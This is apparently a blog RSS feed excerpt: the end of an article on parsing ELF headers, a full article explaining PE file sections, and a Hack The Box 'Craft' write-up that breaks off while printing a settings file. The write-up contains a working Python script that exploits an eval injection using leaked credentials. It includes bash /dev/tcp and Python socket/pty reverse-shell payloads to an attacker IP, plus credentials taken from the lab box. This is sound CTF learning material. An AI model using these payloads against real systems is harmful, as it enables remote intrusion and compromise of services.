  &lt;img src=&#34;https://vlagh3.github.io/img/script_elf_header.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: the &lt;code&gt;e_ident&lt;/code&gt; attribute is having a padding of  8 bytes that are unused. I will let you try to think of methods how to use this in your advantage. 😛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;What I did here was just to make some dictionaries according to the &lt;a href=&#34;https://www.cs.cmu.edu/afs/cs/academic/class/15213-f00/docs/elf.pdf&#34;&gt;ELF paper&lt;/a&gt;. Then create an &lt;code&gt;elf_header&lt;/code&gt; class that has methods for every attribute to retrieve the information based on the file that I opened. We can do this same approach for the program headers and section headers within the binary. The only difference being that there are multiple of those.
So, if we go to the specified offset retrieved from the attribute &lt;code&gt;e_phoff&lt;/code&gt; from the elf header, we can go to the start of the program header table and match the bytes again based on the &lt;code&gt;Elf64_Phdr&lt;/code&gt; struct.

  &lt;img src=&#34;https://vlagh3.github.io/img/Program_header.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;Last but not least, we do the same thing with the section header table.

  &lt;img src=&#34;https://vlagh3.github.io/img/section_header.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;All of the code used for my own readelf ca be found &lt;a href=&#34;https://github.com/vlagh3/interelf&#34;&gt;@ my github&lt;/a&gt;. Also, if you want to go in depth on this topic, you can have a look at the contents in the &lt;a href=&#34;https://github.com/torvalds/linux/blob/master/include/uapi/linux/elf.h&#34;&gt;elf.h&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;What are the take aways from everything we have done here?&lt;/strong&gt;
Never be afraid of testing, playing around and messing up with things. That’s how you learn after all!
This is a simple example I gave you, but with this knowledge, you can come with really creative projects. I already have some ideas that we will discuss in the next articles.&lt;/p&gt;
&lt;p&gt;That’s it folks ! I hope you’ve learned something and developed a better understanding of the ELF format and the linux world.
By no means, I’m an expert in this field and the information I detailed in this article is pure self researching, so any productive criticism is always welcomed.
I’m really curious how you will use what you have learned, so let me know by commenting or contacting me. I’m always excited to talk on different subjects and maybe develop a new project we can work on.
Thanks for reading and I hope you’ve got a great time !&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>PE Sections</title>
      <link>https://vlagh3.github.io/posts/pe_sections/</link>
      <pubDate>Fri, 20 Mar 2020 00:00:00 +0000</pubDate>
      
      <guid>https://vlagh3.github.io/posts/pe_sections/</guid>
      <description>Last time I have introduced you to the PE file format and its structure. Today we will continue discussing about the sections and their importance. So, let’s dive directly into it !
The Data Directory Some data structures need to be quickly located within an executable (e.g the base relocations, imports, etc). So, Windows , provides a way to find those well-known structures in a consistent manner, more explicitly into the DataDirectory attribute of the Optional Header.</description>
      <content>&lt;p&gt;Last time I have introduced you to the PE file format and its structure. Today we will continue discussing about the sections and their importance. So, let’s dive directly into it !&lt;/p&gt;
&lt;h2 id=&#34;the-data-directory&#34;&gt;The Data Directory&lt;/h2&gt;
&lt;p&gt;Some data structures need to be quickly located within an executable &lt;em&gt;(e.g the base relocations, imports, etc)&lt;/em&gt;. So, Windows , provides a way to find those well-known structures in a consistent manner, more explicitly into the &lt;code&gt;DataDirectory&lt;/code&gt; attribute of the Optional Header.
This attribute is just an array of 16 structures. Each array holds an &lt;code&gt;IMAGE_DATA_DIRECTORY&lt;/code&gt; structure. This structure is very simple, and has just 2 elements:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;DWORD VirtualAddress &lt;em&gt;(This is actually a RVA)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;DWORD Size &lt;em&gt;(stores the size of the pointed structure)&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So you can calculate the address ,at which each of the entries reside, with the &lt;code&gt;VirtualAddress&lt;/code&gt; element and get its size by accessing the &lt;code&gt;Size&lt;/code&gt; element. To access those elements you need to specify the correct index in the array. For example if you want to access the &lt;code&gt;Export&lt;/code&gt; table, you will need to specify the index 0, since it’s the first element in the &lt;code&gt;DataDirectory&lt;/code&gt; array.
Below I’ll include all the entries according to Microsoft:

  &lt;img src=&#34;https://vlagh3.github.io/img/Microsoft.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;As you can see, a lot of these entries actually “point” to a section. But why? Why would they make this DataDirectory and not create a section with a Section Header that can provide the information needed to access it?
Well, that’s’ what I asked also, and the answer is pretty simple.&lt;/p&gt;
&lt;p&gt;The linker often merge 2 sections together like the &lt;code&gt;.bss&lt;/code&gt; section and the &lt;code&gt;.data&lt;/code&gt; section.  Thus, you need a way to access them.&lt;/p&gt;
&lt;p&gt;You will see that usually in the Section Header, the file size is smaller than the memory size. Some sections store data that are not necessarily needed to be stored on disk &lt;em&gt;(like the &lt;code&gt;.bss&lt;/code&gt; one)&lt;/em&gt;, and when the executable is loaded into memory, it will actually allocate &lt;em&gt;(for some sections)&lt;/em&gt; more bytes than needed, to store the sections that are useless to store on disk.
To visualize this, I made the following schema:

  &lt;img src=&#34;https://vlagh3.github.io/img/Schema.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;To sum it up, the sections that are not needed to be on disk ,and only in memory, will be merged ,with other sections, in the extra allocated space of another section.&lt;/p&gt;
&lt;h2 id=&#34;sections&#34;&gt;Sections&lt;/h2&gt;
&lt;p&gt;As said earlier, the sections in a PE file are kind of jumping around, depending in which state they are &lt;em&gt;(disk, memory)&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Before I start describing each section, I want to specify the following. Any code or data that might be needed by either the program ,or the operating system, gets its own section. So different files can differ in what kind of sections they have. For example, those are the most typical sections for a EXE file: .text, .bss, .rdata, .data, .idata, .reloc. And for a typical OBJ file: .drectve, .debug$S, .data, .text, .debug$T .&lt;/p&gt;
&lt;p&gt;Ok, now let’s see what kind of sections we have to deal with and what is the role of each one.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.text&lt;/code&gt;: The default section where the actual executable code of the file is stored.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.data&lt;/code&gt;: The default read/write data section. Global variables typically go here.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.rdata&lt;/code&gt;: Read-only data, typically strings go here.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.bss&lt;/code&gt;: Stores unitialized data. Seems to be merged to .data section by the linker, with binaries I looked at.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.rsrc&lt;/code&gt;: The resources are stored in here. This section is read-only. This is a quite interesting sections ,because of course here can be loaded icons and other stuff, but you can also store embedded binaries. Also this section has structures organizating it, some kind of a filesystem.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.reloc&lt;/code&gt;: Base relocations. Relocation information is helping to modify some hardcoded addresses that assume that the code was loaded at its preffered base address in memory. Those are generally needed for DLLs and not EXEs. You can remove them when linking with /FIXED switch.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.crt&lt;/code&gt;: Data added for supporting the C++ runtime (CRT). A good example is the function pointers that are used to call the constructors and destructors of static C++ objects.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.sdata&lt;/code&gt;: “Short” read/write data that can be addressed relative to the global pointer. Used for the IA-64 and other architectures that use a global pointer register.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.didat&lt;/code&gt;: Delayload import data. Found in executables built in nonrelease mode. In release mode, the delayload data is merged into another section.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.debug&lt;/code&gt;: The .debug section is used in object files to contain compiler-generated debug information and in image files to contain all of the debug information that is generated.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.drectve&lt;/code&gt;: Contains linker directives and is only found in OBJs. Directives are ASCII strings that could be passed on the linker command line&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.edata&lt;/code&gt;: Contains information about symbols that other images can access through dynamic linking. Exported symbols are generally found in DLLs, but DLLs can also import symbols.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.idata&lt;/code&gt;: All image files that import symbols, including virtually all executable (EXE) files, have an .idata section.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.pdata&lt;/code&gt;: The exception table. Contains an array of &lt;code&gt;IMAGE_RUNTIME_FUNCTION_ENTRY&lt;/code&gt; structures, which are CPU-specific. Pointed to by the &lt;code&gt;IMAGE_DIRECTORY_ENTRY_EXCEPTION&lt;/code&gt; slot in the &lt;code&gt;DataDirectory&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.tls&lt;/code&gt;: Data for supporting thread local storage variables declared with &lt;code&gt;__declspec(thread)&lt;/code&gt;. This includes the initial value of the data, as well as additional variables needed by the runtime.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.cormeta&lt;/code&gt;: CLR metadata is stored in this section. It is used to indicate that the object file contains managed code.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.sxdata&lt;/code&gt;: The valid exception handlers of an object are listed in the .sxdata section of that object.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;That was a lot of information, I know, but it’s important to know ,at least, the important sections. Besides that, you can always use this as a reference.&lt;/p&gt;
&lt;p&gt;In the final part we will take a look at the import table, export table and some others. Then with all this knowledge, I will show some of the most common types of exploiting the format, and hopefully after all of that , we can get into the really amazing and fun stuff.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Today we talked a little bit more about sections, and we made a high step in understanding this format even better. I really enjoy writing these articles, so I hope you enjoy reading them as much as me writing it :D. Don’t forget to check the resources and also google about this topic and the very interesting ways of taking advantage of this knowledge.&lt;/p&gt;
&lt;h2 id=&#34;resources&#34;&gt;Resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/windows/desktop/Debug/pe-format&#34;&gt;https://docs.microsoft.com/en-us/windows/desktop/Debug/pe-format&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms809762.aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ms809762.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Craft Hackthebox</title>
      <link>https://vlagh3.github.io/writeups/htb/craft/</link>
      <pubDate>Mon, 03 Feb 2020 00:00:00 +0000</pubDate>
      
      <guid>https://vlagh3.github.io/writeups/htb/craft/</guid>
      <description>Changing hosts file By looking at the source code we can see gogs and api subdomains
So I just modified the /etc/hosts to the following in order to access them.
10.10.10.110 craft.htb gogs.craft.htb api.craft.htb Gogs page By a simple Google search we find out that Gogs is a somewhat widely used git service.
Exploring the Craft repo we quickly find that there was an issue and a &amp;ldquo;fix&amp;rdquo; was implemented: By simply looking at the code we can easily identify where the vulnerability is.</description>
      <content>&lt;h2 id=&#34;changing-hosts-file&#34;&gt;Changing hosts file&lt;/h2&gt;
&lt;p&gt;By looking at the source code we can see gogs and api subdomains&lt;/p&gt;
&lt;p&gt;So I just modified the  /etc/hosts to the following in order to access them.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;gogs-page&#34;&gt;Gogs page&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wDN37yi.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;By a simple Google search we find out that &lt;a href=&#34;https://gogs.io/&#34;&gt;Gogs&lt;/a&gt; is a somewhat widely used git service.&lt;/p&gt;
&lt;p&gt;Exploring the Craft repo we quickly find that there was an issue and a &amp;ldquo;fix&amp;rdquo; was implemented:
&lt;img src=&#34;https://i.imgur.com/eAIzGds.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;By simply looking at the code we can easily identify where the vulnerability is. That is, passing user defined input directly into the eval function.&lt;/p&gt;
&lt;p&gt;We can also see that an API is used in the test file, so let&amp;rsquo;s take a look at it as well.&lt;/p&gt;
&lt;h2 id=&#34;api-page&#34;&gt;API page&lt;/h2&gt;
&lt;p&gt;We are presented with this once the page loads:
&lt;img src=&#34;https://i.imgur.com/4cdaJZf.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;So as you can see we can login ( therefore getting a token ), check the validity of the token and delete,update,create,get brews. However we can&amp;rsquo;t interact with it since we don&amp;rsquo;t have any credentials in order to get a token&amp;hellip;&lt;/p&gt;
&lt;p&gt;But wait, let&amp;rsquo;s take a closer look at those 2 commits from before.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/LjZ4X8U.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;OH, there you go, credentials found in the source code. Very bad practice indeed :))&lt;/p&gt;
&lt;h1 id=&#34;exploiting-eval&#34;&gt;Exploiting eval&lt;/h1&gt;
&lt;p&gt;Now that we have the credentials needed to get a token, we need to think of a way to exploit the eval function. Wel&amp;hellip; that&amp;rsquo;s easy we just need to do this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; json
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urllib3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;urllib3&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;disable_warnings()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://api.craft.htb/api/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Session()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth/login&amp;#34;&lt;/span&gt;, auth&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dinesh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4aUh0A8PbVJxgd&amp;#39;&lt;/span&gt;), verify&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;token &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; json&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;loads(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;token&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(token)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abv&amp;#34;&lt;/span&gt;       : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.136/7070 0&amp;gt;&amp;amp;1&amp;#39;)#&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;      : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;brewer&amp;#34;&lt;/span&gt;    : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;style&amp;#34;&lt;/span&gt;     : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; json&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X-Craft-API-Token&amp;#39;&lt;/span&gt;: token,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;brew/&amp;#34;&lt;/span&gt;, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And start our listener:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nc -nvlp &lt;span style=&#34;color:#ae81ff&#34;&gt;7070&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Execute it and&amp;hellip; Nothing. But it sohuld work right?&lt;/p&gt;
&lt;p&gt;Well that&amp;rsquo;s what I thought in the first place as well, but after a lot of thinking, poking and coffe I found out that I was pretty restricted, so I said fuck it. And build the payload from scratch with the things I knew would work.&lt;/p&gt;
&lt;p&gt;Finally I&amp;rsquo;ve ended up with this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;eval(compile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;for x in range(1):&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; import socket,subprocess, os&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; s.connect((&amp;#34;10.10.15.200&amp;#34;, 7070))&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; os.dup2(s.fileno(),0)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; os.dup2(s.fileno(),1)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; os.dup2(s.fileno(),2)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; import pty&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;single&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After running the same script again, but with this payload I&amp;rsquo;ve got a shell.  Hooray!!&lt;/p&gt;
&lt;h1 id=&#34;escaping-the-jail&#34;&gt;Escaping the jail&lt;/h1&gt;
&lt;p&gt;I run &lt;code&gt;whoami&lt;/code&gt; and I&amp;rsquo;m root. Uhmmm&amp;hellip;. That&amp;rsquo;s pretty strange, but ok let&amp;rsquo;s take the root.txt&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat: /root/root.txt: No such file or directory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At this point I was confused, I thought that I gained access to a box that I wasn&amp;rsquo;t supposed to, but that couldn&amp;rsquo;t happen. Thus, I took a deeper look and found out that I was in a jail. However, I was having access to a file that I was previously interested in, but couldn&amp;rsquo;t find it in the gogs page. That file being &lt;em&gt;&lt;code&gt;settings.py&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So I just saw it in the directory I was currently in and took a look at it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Flask settings&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FLASK_SERVER_NAME &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;api.craft.htb&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FLASK_DEBUG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# Do not use debug mode in production&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Flask-Restplus settings&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RESTPLUS_SWAGGER_UI_DOC_EXPANSION &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;list&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RESTPLUS_VALIDATE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RESTPLUS_MASK_SWAGGER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RESTPLUS_ERROR_404_HELP &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CRAFT_API_SECRET &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hz66OCkDtv8G6D&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# database&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MYSQL_DATABASE_USER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;craft&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MYSQL_DATABASE_PASSWORD &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;qLGockJ6G2J75O&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MYSQL_DATABASE_DB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;craft&amp;#39;&lt;/span&gt;
